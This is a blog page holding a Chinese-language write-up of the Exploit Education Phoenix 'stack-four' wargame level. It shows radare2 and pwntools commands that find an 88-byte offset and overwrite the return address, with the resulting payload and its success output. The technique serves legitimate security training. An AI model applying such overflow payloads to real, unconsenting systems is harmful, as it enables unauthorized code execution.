<!DOCTYPE html>
<html lang="en" >

<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="generator" content="Hugo 0.55.6" />
    
    <link rel="canonical" href="https://nut-guo.github.io/posts/exploit-education%E6%95%B4%E7%90%86/" />
    <meta name="description" content="CTF the hard way ">
    

    <title>Exploit Education整理 &middot; Sciver&#39;s Blog</title>

    <link rel="shortcut icon" href="https://nut-guo.github.io/images/favicon.ico" />

    <link rel="stylesheet" href="https://nut-guo.github.io/css/main.css" />
    
        
        <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/atom-one-light.min.css">
        
    
    
    
    <link rel="stylesheet" href="https://nut-guo.github.io/css/">
    
</head>


<body class="loading light-mode">
    
<div class="top">
    <img class="logo" src="https://nut-guo.github.io/images/logo.svg" alt="logo" />
</div>
<div class="bottom">
    <img class="logo" src="https://nut-guo.github.io/images/logo.svg" alt="logo" />
</div>

    <header class="header">
    <ul class="menu clearfix control">
        
<li class="logo-container logo-light">
    <a href="https://nut-guo.github.io/" class="btn logo-link">
        <img class="logo" src="https://nut-guo.github.io/images/logo.svg" alt="logo" />
    </a>
</li>


<li class="logo-container logo-wild">
    <a href="https://nut-guo.github.io/" class="btn logo-link">
        <img class="logo" src="https://nut-guo.github.io/images/logo.svg" alt="logo" />
    </a>
</li>

<li class="logo-container logo-default">
    <a href="https://nut-guo.github.io/" class="btn logo-link">
        <img class="logo" src="https://nut-guo.github.io/images/logo.svg" alt="logo" />
    </a>
</li>

        
        
        
        
        <li 
            class="">
            <a class="btn" id="theme-switcher-button">
                Article
            </a>
            <ul class="sub-menu control">
                
                <li class="">
                    <a href="/posts"
                    
                        class="btn "
                    >Posts</a>
                </li>
                
                <li class="">
                    <a href="/tags"
                    
                        class="btn "
                    >Tags</a>
                </li>
                
                <li class="">
                    <a href="/categories"
                    
                        class="btn "
                    >Categories</a>
                </li>
                
            </ul>
        </li>
        
        
        
        
        <li 
            class="">
            <a class="btn" id="theme-switcher-button">
                View
            </a>
            <ul class="sub-menu control">
                
                <li class="">
                    <a href="#"
                    
                        class="btn toggle-sidebar"
                    >Toggle Sidebar</a>
                </li>
                
            </ul>
        </li>
        
        
        
        
        <li  id="theme-switcher" 
            class="">
            <a class="btn" id="theme-switcher-button">
                Theme
            </a>
            <ul class="sub-menu control">
                
                <li class="">
                    <a href="#"
                    
                        
                        data-theme="light" class="btn"
                        
                    >Light</a>
                </li>
                
                <li class="">
                    <a href="#"
                    
                        
                        data-theme="dark" class="btn"
                        
                    >Dark</a>
                </li>
                
                <li class="">
                    <a href="#"
                    
                        
                        data-theme="wild" class="btn"
                        
                    >Wild</a>
                </li>
                
                <li class="">
                    <a href="#"
                    
                        
                        class="export-wild btn"
                        
                    >Export Wild Style</a>
                </li>
                
            </ul>
        </li>
        
        
    </ul>
</header>

    <div class="middle">
        <nav class="sidebar">
            <ul class="posts control">
    
    <li><a class="no-break btn" href='/posts/ioli%E6%95%B4%E7%90%86/'><i class="icon icon-post"></i>IOLI整理</a></li>
    
    <li><a class="no-break btn" href='/posts/exploit-education%E6%95%B4%E7%90%86/'><i class="icon icon-post"></i>Exploit Education整理</a></li>
    
    <li><a class="no-break btn" href='/posts/pwnable.kr/'><i class="icon icon-post"></i>Pwnable.kr</a></li>
    
    <li><a class="no-break btn" href='/posts/%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/'><i class="icon icon-post"></i>资源整理</a></li>
    
    <li><a class="no-break btn" href='/posts/8086cpu%E6%A6%82%E8%BF%B0/'><i class="icon icon-post"></i>8086CPU概述</a></li>
    
    <li><a class="no-break btn" href='/posts/manjaro%E8%A3%85%E6%9C%BA%E8%AE%B0%E5%BD%95/'><i class="icon icon-post"></i>Manjaro装机记录</a></li>
    
</ul>

        </nav>
        <main class="main">
            <article class="article">
    <h2 class="title"><a href='/posts/exploit-education%E6%95%B4%E7%90%86/' class="btn">Exploit Education整理</a></h2>
    <div class="article-meta clearfix">
        <ul class="dates clearfix left control">
            <li><i class="icon icon-date"></i></li>
            <li class="publish-date">
                <time datetime="2019.06.06">2019.06.06</time>
            </li>
        </ul>
        
        <ul class="article-categories clearfix left control">
            <li><i class="icon icon-categories"></i></li>
            
            <li>
                <a href="https://nut-guo.github.io/categories/ctf/" class="btn">CTF</a>
            </li>
            
            <li>
                <a href="https://nut-guo.github.io/categories/wargame/" class="btn">Wargame</a>
            </li>
            
        </ul>
        
        
        <div class="article-meta-splitter clearfix"></div>
        <ul class="article-tags clearfix control">
            <li><i class="icon icon-tags"></i></li>
            
            <li>
                <a href="https://nut-guo.github.io/tags/ctf/" class="btn">CTF</a>
            </li>
            
            <li>
                <a href="https://nut-guo.github.io/tags/wargame/" class="btn">Wargame</a>
            </li>
            
        </ul>
        
    </div>
    <div class="content">
        
        

<h1 id="exploit-education整理">Exploit Education整理</h1>

<h2 id="phoenix">Phoenix</h2>

<h3 id="stack-four">stack-four</h3>

<p>不同于之前几道题目静态分析的方法，此题涉及到多个函数之间的跳转，单纯的静态分析不太方便，利用pattern动态调试，根据覆盖eip的串的偏移确定偏移量。具体的操作中有多种选择，gdb，pwntools，radare2中都有相应的工具。重点整理radare2的解法。</p>

<p>运行程序给出输入后大概理解是需要利用输入覆盖函数的返回值，为简单的栈溢出。</p>

<p>在radare2中利用afl查看函数</p>

<pre><code>[0x004004b0]&gt; afl
0x00400438    1 13           sym._init
0x00400460    2 16   -&gt; 32   sym.imp.printf
0x00400470    2 16   -&gt; 48   sym.imp.gets
0x00400480    2 16   -&gt; 48   sym.imp.puts
0x00400490    2 16   -&gt; 48   sym.imp.exit
0x004004a0    2 16   -&gt; 48   sym.imp.__libc_start_main
0x004004b0    1 57           entry0
0x004004f0    3 35           sym.deregister_tm_clones
0x00400520    3 53           sym.register_tm_clones
0x00400560    8 130          sym.__do_global_dtors_aux
0x004005f0    3 45   -&gt; 40   sym.frame_dummy
0x0040061d    1 24           sym.complete_level
0x00400635    1 53           sym.start_level
0x0040066a    1 42           sym.main
0x004006a0    5 66   -&gt; 56   sym.__do_global_ctors_aux
0x004006e2    1 8            sym._fini
</code></pre>

<p>初步确定我们需要将eip的值覆盖为目标函数sym.complete_level的地址0x0040061d，具体的偏移通过动态调试来进行分析。</p>

<p>利用radare2这个工具。</p>

<p><code>ragg2 -P 100 -r &gt; /tmp/s4-payload</code></p>

<p>生成长度为100的De Bruijn Sequence,并重定向到文件中。然后设置r2profile。</p>

<pre><code>user@phoenix-amd64:/opt/phoenix/amd64$ vim /tmp/r2profile.rr2 
user@phoenix-amd64:/opt/phoenix/amd64$ cat /tmp/r2profile.rr2 
#!/usr/bin/rarun2
stdin=/tmp/s4
</code></pre>

<p>将标准输入更改为我们事先写好的文件，并且设置的运行程序为rarun2。</p>

<p>此后利用radare2进行调试。</p>

<pre><code>user@phoenix-amd64:/opt/phoenix/amd64$ r2 -d ./stack-four -e dbg.profile=/tmp/r2profile.rr2 
Process with PID 568 started...
= attach 568 568
bin.baddr 0x00400000
USING 400000
Assuming filepath /opt/phoenix/amd64/stack-four
asm.bits 64
[0x7ffff7dc5d34]&gt; dc
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x4141664141654141
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
= attach 568 1
[0x4141664141654141]&gt; 
</code></pre>

<p>其中设置的参数，-d表示debug，即调试模式打开文件，-e设置变量，将dbg.profile修改为我们预先写好的profile文件。</p>

<p>此时观察到一方面题目中对于返回的地址给出了一个反馈，另一方面，可以通过当前seek的地址来确定eip的值，或者也可以直接在r2中查看寄存器的值。总之我们可以确定当前的eip的值被更改为了0x4141664141654141
利用wopO对该串进行定位，后接参数8表示串的大小为8（64位程序地址为8bytes，而默认大小为4）。确定了偏移量为88。</p>

<pre><code>[0x4141664141654141]&gt; wopO 0x4141664141654141 8
88
</code></pre>

<p>下面构造输入。利用python构造输入。</p>

<pre><code>user@phoenix-amd64:/opt/phoenix/amd64$ python -c &quot;from pwn import *;print 'A'*88+p64(0x0040061d)&quot; &gt;/tmp/s4
</code></pre>

<p>测试</p>

<pre><code>user@phoenix-amd64:/opt/phoenix/amd64$ r2 -d ./stack-four -e dbg.profile=/tmp/r2profile.rr2 
Process with PID 587 started...
= attach 587 587
bin.baddr 0x00400000
USING 400000
Assuming filepath /opt/phoenix/amd64/stack-four
asm.bits 64
[0x7ffff7dc5d34]&gt; dc
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
PTRACE_EVENT_EXIT pid=587, status=0x0
= attach 587 1
[0x7ffff7d9021f]&gt; 
</code></pre>

<p>完成。</p>

        
    </div>

</article>
<section class="comment">
    <p class="local-info">
        Comment is disabled to avoid unwanted discussions from 'localhost:1313' on your Disqus
        account...
    </p>
    <div id="disqus_thread"></div>
</section>
<script type="text/javascript">

    (function () {
        if (window.location.hostname == "localhost") {
            return
        }
        document.querySelector('.local-info').classList.add('hide')

        let dsq = document.createElement('script')
        dsq.type = 'text/javascript'
        dsq.async = true
        let disqus_shortname = 'Sciver'
        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
    })()
</script>


        </main>
    </div>
    <footer class="footer clearfix">
    <ul class="control social clearfix">
        <li><a class="author btn" href="#">Sciver</a></li>
        
        
        
        
        
        
        
        
        
        
        
        <li>
            <a class="icon-link btn" href="https://nut-guo.github.io/index.xml" type="application/rss+xml" title="rss">
                <i class="rss icon"></i></a>
        </li>
    </ul>

    <ul class="control status clearfix">
        <li><a href="#" class="btn">Posts:
                7</a>
        </li>
        <li><a href="#" class="btn">Pages:
                0</a></li>
        <li><a href="#" class="btn">en</a></li>
        <li><a href="https://gohugo.io" class="btn">Hugo, 0.55.6</a></li>
        <li><a href="https://github.com/jacobsun/edidor" class="btn">Theme: Edidor</a></li>
        <li>
            <a href="#" class="btn">Last build: <time
                    datetime=""></time>
            </a>
        </li>
    </ul>
</footer>
<div class="dialog">
    <div class="wrapper">
        <div class="clearfix"><button class="btn close-dialog">X</button></div>
        <header>
            <h1 class="title">Theme Name</h1>
        </header>
        <main>
            <div class="clearfix">
                <label for="theme-name">
                    <p>Only English Character, space, hyphen are allowed!</p>
                    <p>Valid name examples: "custom", "fantastic theme", "my-theme"</p>
                    <p>Invalid name examles: "我的主题", ":)", "123"</p>
                </label>
                <input type="text" name="theme-name" id="theme-name">
            </div>
            <div class="clearfix">
                <button class="btn export">Export</button>
            </div>

        </main>
        <footer></footer>
    </div>
</div>

    <script src="https://nut-guo.github.io/js/main.js"></script>

    <script src="https://nut-guo.github.io/js/"></script>



<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/highlight.min.js"></script>

<script>hljs.initHighlightingOnLoad();</script>

<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-141115323-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

</body>

</html>
